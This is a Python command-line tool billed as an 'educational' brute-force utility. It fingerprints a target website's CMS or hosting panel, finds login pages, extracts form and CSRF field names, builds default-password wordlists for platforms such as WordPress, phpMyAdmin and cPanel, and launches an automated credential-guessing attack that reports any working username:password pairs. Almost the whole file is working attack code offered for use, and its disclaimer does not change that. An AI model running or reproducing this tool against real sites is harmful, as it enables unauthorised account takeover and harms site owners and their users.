#!/usr/bin/env python3
"""
Smart Educational Brute Force Tool with Website Detection
This tool automatically detects website types and configures accordingly.
Educational purposes only - use responsibly on systems you own or have permission to test.
"""

import requests
import json
import re
import argparse
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import time
from advanced_bruteforce import AdvancedLoginTester, load_wordlist, create_comprehensive_wordlists, save_results

class SmartWebsiteDetector:
    def __init__(self, base_url, timeout=10):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Load website configurations
        try:
            with open('website_configs.json', 'r') as f:
                self.configs = json.load(f)
        except FileNotFoundError:
            print("Warning: website_configs.json not found. Using basic detection.")
            self.configs = {}
    
    def detect_website_type(self):
        """Detect the type of website and return appropriate configuration"""
        print(f"Analyzing website: {self.base_url}")
        
        try:
            # Get the main page
            response = self.session.get(self.base_url, timeout=self.timeout)
            content = response.text.lower()
            headers = response.headers
            
            # Detection patterns
            detections = []
            
            # WordPress detection
            if any(indicator in content for indicator in [
                'wp-content', 'wp-includes', 'wordpress', '/wp-json/',
                'wp-admin', 'wp-login.php'
            ]):
                detections.append(('wordpress', 0.9))
            
            # Drupal detection
            if any(indicator in content for indicator in [
                'drupal', 'sites/default', '/core/', 'drupal.js',
                'x-drupal-cache' in str(headers)
            ]):
                detections.append(('drupal', 0.9))
            
            # Joomla detection
            if any(indicator in content for indicator in [
                'joomla', '/media/jui/', 'option=com_', 'administrator/index.php'
            ]):
                detections.append(('joomla', 0.9))
            
            # Laravel detection
            if any(indicator in content for indicator in [
                'laravel_session', 'csrf-token', '_token', 'laravel'
            ]):
                detections.append(('laravel', 0.8))
            
            # Django detection
            if any(indicator in content for indicator in [
                'django', 'csrfmiddlewaretoken', '/admin/login/',
                'x-frame-options' in str(headers) and 'django' in str(headers)
            ]):
                detections.append(('django', 0.8))
            
            # phpMyAdmin detection
            if any(indicator in content for indicator in [
                'phpmyadmin', 'pma_username', 'pma_password'
            ]):
                detections.append(('phpmyadmin', 0.95))
            
            # cPanel detection
            if any(indicator in content for indicator in [
                'cpanel', 'whm', ':2083', 'cpanel, inc'
            ]):
                detections.append(('cpanel', 0.9))
            
            # Plesk detection
            if any(indicator in content for indicator in [
                'plesk', 'parallels', ':8443'
            ]):
                detections.append(('plesk', 0.9))
            
            # Sort by confidence
            detections.sort(key=lambda x: x[1], reverse=True)
            
            if detections:
                detected_type = detections[0][0]
                confidence = detections[0][1]
                print(f"Detected website type: {detected_type} (confidence: {confidence:.1%})")
                return detected_type
            else:
                print("Could not detect specific website type, using generic configuration")
                return 'generic_form'
                
        except Exception as e:
            print(f"Error during detection: {e}")
            return 'generic_form'
    
    def find_login_pages(self, website_type):
        """Find potential login pages based on website type"""
        config = self.configs.get(website_type, self.configs.get('generic_form', {}))
        
        # Common login paths to try
        common_paths = [
            '/login',
            '/admin',
            '/admin/login',
            '/administrator',
            '/wp-admin',
            '/wp-login.php',
            '/user/login',
            '/signin',
            '/auth/login',
            '/account/login'
        ]
        
        # Add config-specific path
        if config.get('login_path'):
            common_paths.insert(0, config['login_path'])
        
        found_pages = []
        
        for path in common_paths:
            try:
                url = urljoin(self.base_url, path)
                response = self.session.get(url, timeout=self.timeout)
                
                if response.status_code == 200:
                    # Check if it looks like a login page
                    content = response.text.lower()
                    if any(indicator in content for indicator in [
                        'password', 'login', 'signin', 'username', 'email'
                    ]):
                        found_pages.append({
                            'url': url,
                            'path': path,
                            'status': response.status_code,
                            'has_form': '<form' in content
                        })
                        print(f"Found potential login page: {url}")
                
            except Exception as e:
                continue
        
        return found_pages
    
    def analyze_login_form(self, login_url, website_type):
        """Analyze the login form and extract field information"""
        try:
            response = self.session.get(login_url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find login forms
            forms = soup.find_all('form')
            login_form = None
            
            for form in forms:
                # Look for password fields
                if form.find('input', {'type': 'password'}):
                    login_form = form
                    break
            
            if not login_form:
                return None
            
            # Get form action
            action = login_form.get('action', '')
            if action:
                form_url = urljoin(login_url, action)
            else:
                form_url = login_url
            
            # Extract field names
            username_field = None
            password_field = None
            csrf_field = None
            
            # Get password field
            password_input = login_form.find('input', {'type': 'password'})
            if password_input:
                password_field = password_input.get('name')
            
            # Get username field
            text_inputs = login_form.find_all('input', {'type': ['text', 'email']})
            for inp in text_inputs:
                name = inp.get('name', '').lower()
                if any(field in name for field in ['user', 'login', 'email', 'account']):
                    username_field = inp.get('name')
                    break
            
            if not username_field and text_inputs:
                username_field = text_inputs[0].get('name')
            
            # Look for CSRF token
            csrf_inputs = login_form.find_all('input', {'type': 'hidden'})
            for inp in csrf_inputs:
                name = inp.get('name', '').lower()
                if any(token in name for token in ['csrf', 'token', '_token']):
                    csrf_field = inp.get('name')
                    break
            
            return {
                'form_url': form_url,
                'username_field': username_field,
                'password_field': password_field,
                'csrf_field': csrf_field,
                'method': login_form.get('method', 'POST').upper()
            }
            
        except Exception as e:
            print(f"Error analyzing form: {e}")
            return None
    
    def get_targeted_wordlists(self, website_type):
        """Get targeted wordlists based on website type"""
        config = self.configs.get(website_type, {})
        
        # Base wordlists
        base_usernames = ['admin', 'administrator', 'user', 'test', 'guest']
        base_passwords = ['password', '123456', 'admin', 'test', 'guest']
        
        # Add website-specific usernames
        if config.get('common_usernames'):
            base_usernames.extend(config['common_usernames'])
        
        # Website-specific password patterns
        website_passwords = {
            'wordpress': ['wp-admin', 'wordpress', 'wp123'],
            'drupal': ['drupal', 'drupal123', 'admin123'],
            'joomla': ['joomla', 'joomla123', 'administrator'],
            'phpmyadmin': ['mysql', 'phpmyadmin', 'root', ''],
            'cpanel': ['cpanel', 'hosting', 'server'],
            'plesk': ['plesk', 'parallels', 'hosting']
        }
        
        if website_type in website_passwords:
            base_passwords.extend(website_passwords[website_type])
        
        return list(set(base_usernames)), list(set(base_passwords))

def main():
    parser = argparse.ArgumentParser(description='Smart Educational Brute Force Tool')
    parser.add_argument('url', help='Target website URL')
    parser.add_argument('-u', '--usernames', help='Custom username wordlist file')
    parser.add_argument('-p', '--passwords', help='Custom password wordlist file')
    parser.add_argument('-d', '--delay', type=float, default=2.0,
                       help='Delay between requests (seconds, default: 2.0)')
    parser.add_argument('-t', '--threads', type=int, default=1,
                       help='Number of threads (use with caution)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds')
    parser.add_argument('--skip-detection', action='store_true',
                       help='Skip automatic website detection')
    parser.add_argument('--website-type', choices=['wordpress', 'drupal', 'joomla', 'laravel', 'django', 'flask', 'phpmyadmin', 'cpanel', 'plesk', 'generic_form'],
                       help='Manually specify website type')
    parser.add_argument('-o', '--output', help='Output file for results (JSON)')
    parser.add_argument('--create-wordlists', action='store_true',
                       help='Create comprehensive wordlists')
    parser.add_argument('--list-configs', action='store_true',
                       help='List available website configurations')
    
    args = parser.parse_args()
    
    if args.create_wordlists:
        create_comprehensive_wordlists()
        return
    
    if args.list_configs:
        try:
            with open('website_configs.json', 'r') as f:
                configs = json.load(f)
            print("Available website configurations:")
            for key, config in configs.items():
                print(f"  {key}: {config['name']}")
                print(f"    Login path: {config['login_path']}")
                print(f"    Fields: {config['username_field']}/{config['password_field']}")
                print()
        except FileNotFoundError:
            print("website_configs.json not found")
        return
    
    # Initialize detector
    detector = SmartWebsiteDetector(args.url, args.timeout)
    
    # Detect website type
    if args.website_type:
        website_type = args.website_type
        print(f"Using manually specified website type: {website_type}")
    elif args.skip_detection:
        website_type = 'generic_form'
        print("Skipping detection, using generic configuration")
    else:
        website_type = detector.detect_website_type()
    
    # Find login pages
    print("\nSearching for login pages...")
    login_pages = detector.find_login_pages(website_type)
    
    if not login_pages:
        print("No login pages found. Try specifying a direct login URL.")
        return
    
    # Use the first found login page
    login_page = login_pages[0]
    print(f"Using login page: {login_page['url']}")
    
    # Analyze the login form
    print("\nAnalyzing login form...")
    form_info = detector.analyze_login_form(login_page['url'], website_type)
    
    if not form_info:
        print("Could not analyze login form. Using default configuration.")
        config = detector.configs.get(website_type, detector.configs.get('generic_form', {}))
        form_info = {
            'form_url': login_page['url'],
            'username_field': config.get('username_field', 'username'),
            'password_field': config.get('password_field', 'password'),
            'csrf_field': config.get('csrf_field'),
            'method': 'POST'
        }
    
    print(f"Form URL: {form_info['form_url']}")
    print(f"Username field: {form_info['username_field']}")
    print(f"Password field: {form_info['password_field']}")
    if form_info['csrf_field']:
        print(f"CSRF field: {form_info['csrf_field']}")
    
    # Load wordlists
    if args.usernames and args.passwords:
        usernames = load_wordlist(args.usernames)
        passwords = load_wordlist(args.passwords)
    else:
        print("\nGenerating targeted wordlists...")
        usernames, passwords = detector.get_targeted_wordlists(website_type)
        print(f"Generated {len(usernames)} usernames and {len(passwords)} passwords")
    
    if not usernames or not passwords:
        print("No valid wordlists available.")
        return
    
    # Initialize and run the attack
    print(f"\nStarting brute force attack...")
    print(f"Target: {form_info['form_url']}")
    print(f"Combinations: {len(usernames)} × {len(passwords)} = {len(usernames) * len(passwords)}")
    print(f"Estimated time: {len(usernames) * len(passwords) * args.delay / 60:.1f} minutes")
    print("-" * 60)
    
    tester = AdvancedLoginTester(
        form_info['form_url'],
        delay=args.delay,
        threads=args.threads,
        timeout=args.timeout
    )
    
    try:
        tester.run_attack(
            usernames, 
            passwords, 
            form_info['form_url'],
            form_info['username_field'],
            form_info['password_field']
        )
    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
    
    # Print results
    print("\n" + "="*60)
    print("ATTACK RESULTS")
    print("="*60)
    print(f"Website type: {website_type}")
    print(f"Total attempts: {tester.total_attempts}")
    print(f"Failed attempts: {tester.failed_attempts}")
    print(f"Successful logins: {len(tester.successful_logins)}")
    
    if tester.successful_logins:
        print("\n🎯 SUCCESSFUL CREDENTIALS FOUND:")
        for login in tester.successful_logins:
            print(f"  ✓ {login['username']}:{login['password']}")
            print(f"    Status: {login['status_code']}, Response time: {login['response_time']:.2f}s")
            if login.get('redirect_location'):
                print(f"    Redirect: {login['redirect_location']}")
    else:
        print("\n❌ No successful logins found")
    
    # Save results
    if args.output:
        save_results(tester, args.output)

if __name__ == "__main__":
    main()